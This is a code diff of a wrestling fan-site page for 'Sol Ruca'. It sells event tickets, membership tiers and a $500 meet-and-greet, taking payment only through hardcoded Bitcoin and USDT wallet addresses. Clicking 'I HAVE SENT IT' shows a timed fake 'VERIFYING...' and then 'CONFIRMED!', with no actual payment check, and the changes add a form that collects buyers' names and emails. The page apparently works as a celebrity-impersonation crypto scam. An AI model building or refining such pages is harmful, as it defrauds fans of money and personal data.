@@ -16,17 +16,16 @@
         body { font-family: 'Inter', sans-serif; background: #050505; color: white; overflow-x: hidden; }
         .glass { background: rgba(255,255,255,0.03); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.08); }
         
-        /* Updated Hero and Cards with working high-res wrestling images */
+        /* RESTORED YOUR IMGUR HERO */
         .hero-img { 
-            background: linear-gradient(to bottom, rgba(5,5,5,0.5), #050505), url('https://wallpapercave.com/wp/wp11894901.jpg'); 
-            background-size: cover; background-position: center; 
+            background: linear-gradient(to bottom, rgba(5,5,5,0.5), #050505), url('https://i.imgur.com/OGKm7lg.jpeg'); 
+            background-size: cover; background-position: center 20%; 
         }
         .match-card { background-color: #111; background-size: cover; background-position: center; transition: transform 0.4s; }
         .match-card:hover { transform: scale(1.02); }
         .hidden-section { display: none !important; }
         .font-title { font-family: 'Syncopate', sans-serif; }
         
-        /* Fixed Video Container */
         .video-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 20px; background: #000; }
         .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 0; }
     </style>
@@ -59,7 +58,7 @@
         <section class="py-24 px-8 bg-[#080808]">
             <h2 class="text-4xl font-title text-center mb-16 uppercase italic">Featured Events</h2>
             <div class="grid md:grid-cols-2 gap-8 max-w-6xl mx-auto">
-                <div class="match-card h-[450px] rounded-[40px] relative overflow-hidden border border-white/5" style="background-image: linear-gradient(to top, #000, transparent), url('https://images.lifestyleasia.com/wp-content/uploads/sites/6/2023/04/04124903/wrestlemania-39-highlights-1600x900.jpg')">
+                <div class="match-card h-[450px] rounded-[40px] relative overflow-hidden border border-white/5" style="background-image: linear-gradient(to top, #000, transparent), url('https://www.wwe.com/f/all/2023/03/001_WM39_04012023_JJ_0001--223f66c0d8b335606d15b09000b21389.jpg')">
                     <div class="absolute inset-0 p-10 flex flex-col justify-end">
                         <span class="text-yellow-500 font-bold tracking-[0.3em] text-[10px] mb-2 uppercase">PREMIUM LIVE EVENT</span>
                         <h3 class="text-3xl font-title mb-2">Vengeance Day</h3>
@@ -67,7 +66,7 @@
                         <button onclick="openAuth('signup')" class="w-fit px-8 py-3 bg-white text-black font-black rounded-full text-[10px] uppercase">Get Tickets</button>
                     </div>
                 </div>
-                <div class="match-card h-[450px] rounded-[40px] relative overflow-hidden border border-white/5" style="background-image: linear-gradient(to top, #000, transparent), url('https://www.wwe.com/f/all/2023/03/001_WM39_04012023_JJ_0001--223f66c0d8b335606d15b09000b21389.jpg')">
+                <div class="match-card h-[450px] rounded-[40px] relative overflow-hidden border border-white/5" style="background-image: linear-gradient(to top, #000, transparent), url('https://images.lifestyleasia.com/wp-content/uploads/sites/6/2023/04/04124903/wrestlemania-39-highlights-1600x900.jpg')">
                     <div class="absolute inset-0 p-10 flex flex-col justify-end">
                         <span class="text-yellow-500 font-bold tracking-[0.3em] text-[10px] mb-2 uppercase">THE GRAND STAGE</span>
                         <h3 class="text-3xl font-title mb-2">WrestleMania 42</h3>
@@ -85,12 +84,7 @@
                 <h2 class="text-4xl font-title uppercase">Sol Vault / <span id="welcome-name" class="text-yellow-500"></span></h2>
                 <div class="glass p-6 rounded-[32px] border-yellow-500/20 shadow-2xl">
                     <div class="video-container">
-                        <iframe 
-                            src="https://www.youtube-nocookie.com/embed/ucH_JlCGrFc?rel=0&modestbranding=1" 
-                            title="Sol Ruca Highlights" 
-                            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
-                            allowfullscreen>
-                        </iframe>
+                        <iframe src="https://www.youtube-nocookie.com/embed/ucH_JlCGrFc?rel=0&modestbranding=1" allowfullscreen></iframe>
                     </div>
                 </div>
                 <div>
@@ -120,7 +114,7 @@
                     <h3 class="text-center font-title text-sm mb-6 uppercase italic text-yellow-500">Tier Upgrades</h3>
                     <div id="tier-container" class="space-y-4"></div>
                 </div>
-                <button onclick="showDetails('Meet & Greet', 500, 'VIP', 'Global Tour', 'Private Session with Sol.')" class="w-full py-8 bg-yellow-500 text-black font-black rounded-[30px] uppercase text-sm tracking-widest shadow-2xl hover:scale-105 transition">Request Meet & Greet</button>
+                <button onclick="showDetails('Meet & Greet', 500, 'VIP', 'Global Tour', 'Includes: Private Meal with Sol, 3 Professional Selfies, Signed 8x10, and Exclusive Q&A.')" class="w-full py-8 bg-yellow-500 text-black font-black rounded-[30px] uppercase text-sm tracking-widest shadow-2xl hover:scale-105 transition">Request Meet & Greet</button>
             </div>
         </div>
     </div>
@@ -128,6 +122,7 @@
     <div id="universal-modal" class="hidden-section fixed inset-0 z-[500] flex items-center justify-center bg-black/98 p-6 overflow-y-auto">
         <div class="glass max-w-md w-full p-10 rounded-[45px] relative border-white/10">
             <button onclick="closeModals()" class="absolute top-8 right-8 text-gray-500"><i data-lucide="x"></i></button>
+            
             <div id="stage-details" class="space-y-6 text-center">
                 <h4 id="det-title" class="text-2xl font-title text-yellow-500 uppercase italic"></h4>
                 <p id="det-venue" class="text-[10px] text-gray-400 font-bold uppercase tracking-widest"></p>
@@ -139,15 +134,25 @@
                 <p id="total-price-display" class="text-4xl font-black">$0</p>
                 <button onclick="nextStage()" class="w-full py-5 bg-yellow-500 text-black font-black rounded-2xl uppercase">Continue</button>
             </div>
+
+            <div id="stage-form" class="hidden-section space-y-4 pt-6">
+                <h2 class="text-xl font-title text-center text-yellow-500 uppercase">Booking Info</h2>
+                <input type="text" placeholder="Full Name" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none">
+                <input type="email" placeholder="Email Address" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none">
+                <button onclick="showStage('wallets')" class="w-full py-5 bg-yellow-500 text-black font-black rounded-2xl uppercase">Next</button>
+            </div>
+
             <div id="stage-wallets" class="hidden-section space-y-4 pt-6">
                 <button onclick="showFinalWallet('BTC', 'bc1q4c6f7xzsekkpvd2guwkaww4m7se9yjlrxnrjc7')" class="w-full p-6 glass rounded-2xl font-bold uppercase">Bitcoin</button>
                 <button onclick="showFinalWallet('USDT', '0x08cfe6ddc3b58b0655dd1c9214bcfddbd3855cca')" class="w-full p-6 glass rounded-2xl font-bold uppercase">USDT (ERC20)</button>
             </div>
+
             <div id="stage-address" class="hidden-section text-center pt-6 space-y-6">
                 <div class="bg-white p-2 rounded-xl w-32 h-32 mx-auto"><img id="qr-img" src="" class="w-full"></div>
                 <p id="wallet-addr" class="text-[9px] font-mono break-all opacity-50"></p>
                 <button onclick="processFinal()" class="w-full py-5 bg-yellow-500 text-black font-bold rounded-xl">I HAVE SENT IT</button>
             </div>
+
             <div id="stage-loading" class="hidden-section py-10 text-center"><p class="animate-pulse">VERIFYING...</p></div>
             <div id="stage-thankyou" class="hidden-section py-10 text-center"><h2 class="text-2xl font-title text-yellow-500">CONFIRMED!</h2><button onclick="closeModals()" class="mt-4 text-xs underline">Back to Vault</button></div>
         </div>
@@ -177,21 +182,20 @@
         let db = JSON.parse(localStorage.getItem('sol_fans')) || [];
         let cur = { title: '', price: 0, qty: 1 };
 
-        function toast(txt) { 
-            Toastify({ text: txt, duration: 3000, position: "right", style: { background: "#fbbf24", color: "#000", fontWeight: "900", borderRadius: "12px" } }).showToast(); 
-        }
-
         const matches = [
             { name: "NXT New Year's Evil", date: "Jan 06, 2026", price: 85, v: "Orlando, FL" },
             { name: "NXT Live! Knoxville", date: "Jan 29, 2026", price: 45, v: "Knoxville, TN" },
             { name: "NXT Vengeance Day", date: "Feb 08, 2026", price: 120, v: "Atlanta, GA" }
         ];
 
-        function openAuth(m) { 
-            document.getElementById('auth-modal').classList.remove('hidden-section'); 
-            document.getElementById('signup-box').classList.toggle('hidden-section', m === 'login'); 
-            document.getElementById('login-box').classList.toggle('hidden-section', m === 'signup'); 
-        }
+        const tiers = [
+            { name: "Gold", price: 250, col: "text-yellow-400" },
+            { name: "Diamond", price: 300, col: "text-blue-300" },
+            { name: "Master", price: 400, col: "text-yellow-600" }
+        ];
+
+        function toast(txt) { Toastify({ text: txt, duration: 3000, position: "right", style: { background: "#fbbf24", color: "#000", fontWeight: "900", borderRadius: "12px" } }).showToast(); }
+        function openAuth(m) { document.getElementById('auth-modal').classList.remove('hidden-section'); document.getElementById('signup-box').classList.toggle('hidden-section', m === 'login'); document.getElementById('login-box').classList.toggle('hidden-section', m === 'signup'); }
         function closeModals() { document.getElementById('auth-modal').classList.add('hidden-section'); document.getElementById('universal-modal').classList.add('hidden-section'); }
         
         function showDetails(title, price, type, venue, desc) {
@@ -210,16 +214,23 @@
         }
 
         function showStage(s) {
-            ['details','wallets','address','loading','thankyou'].forEach(id => document.getElementById('stage-'+id).classList.add('hidden-section'));
+            ['details', 'form', 'wallets', 'address', 'loading', 'thankyou'].forEach(id => {
+                const el = document.getElementById('stage-'+id);
+                if(el) el.classList.add('hidden-section');
+            });
             document.getElementById('stage-'+s).classList.remove('hidden-section');
         }
 
-        function nextStage() { showStage('wallets'); }
+        function nextStage() { 
+            if(cur.title === 'Meet & Greet') showStage('form'); else showStage('wallets'); 
+        }
+
         function showFinalWallet(m, a) {
             showStage('address');
             document.getElementById('wallet-addr').innerText = a;
             document.getElementById('qr-img').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${a}`;
         }
+
         function processFinal() { showStage('loading'); setTimeout(() => showStage('thankyou'), 3000); }
 
         function previewImage(input) {
@@ -253,21 +264,25 @@
                 document.getElementById('nav-avatar').src = `https://ui-avatars.com/api/?name=${u.name}&background=fbbf24&color=000`;
                 document.getElementById('card-avatar').src = `https://ui-avatars.com/api/?name=${u.name}&background=333&color=fff`;
 
-                const container = document.getElementById('ticket-container');
-                container.innerHTML = matches.map(m => `
+                document.getElementById('ticket-container').innerHTML = matches.map(m => `
                     <div class="glass p-5 rounded-3xl flex justify-between items-center border-white/5">
                         <div class="w-2/3">
                             <p class="text-[9px] text-yellow-500 font-bold uppercase">${m.date}</p>
                             <h4 class="font-bold text-xs truncate uppercase">${m.name}</h4>
                             <p class="text-[8px] text-gray-500">${m.v}</p>
                         </div>
-                        <button onclick="showDetails('${m.name}', ${m.price}, 'Ticket', '${m.v}', 'Access to live event.')" class="bg-yellow-500 text-black px-4 py-2 rounded-xl text-[10px] font-black uppercase">Buy</button>
+                        <button onclick="showDetails('${m.name}', ${m.price}, 'Ticket', '${m.v}', 'Live Access.')" class="bg-yellow-500 text-black px-4 py-2 rounded-xl text-[10px] font-black uppercase">Buy</button>
                     </div>`).join('');
+
+                document.getElementById('tier-container').innerHTML = tiers.map(t => `
+                    <div class="p-4 rounded-2xl bg-white/5 flex justify-between items-center">
+                        <div><b class="${t.col} text-[10px] uppercase">${t.name}</b><p class="text-[10px]">$${t.price}</p></div>
+                        <button onclick="showDetails('${t.name}', ${t.price}, 'Tier', 'VIP', 'Upgrade Account.')" class="text-[9px] border border-yellow-500 text-yellow-500 px-3 py-1 rounded uppercase">Join</button>
+                    </div>`).join('');
+
                 closeModals();
                 toast("LOGGED IN AS " + u.name.toUpperCase());
-            } else {
-                toast("INVALID LOGIN!");
-            }
+            } else { toast("INVALID LOGIN!"); }
         }
     </script>
 </body>
